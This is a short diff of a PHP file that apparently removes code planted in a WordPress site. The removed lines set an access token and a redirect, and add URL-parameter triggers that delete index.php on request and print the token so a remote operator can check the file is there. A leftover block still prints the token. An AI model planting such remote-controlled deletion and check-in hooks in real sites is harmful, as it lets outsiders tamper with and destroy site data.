@@ -1,16 +1,5 @@
 <?php
-// Created By Urie
 
-define('LOCATION', "https://google.com");
-define('CHECKUP', "AccessID923487");
-define('wplink', '/wp-blog-header.php');
-
-if (isset($_GET["del"]))
-{
-    unlink("index.php");
-    exit;
-}
-if (isset($_GET["check"]))
 {
     print CHECKUP;
     exit;
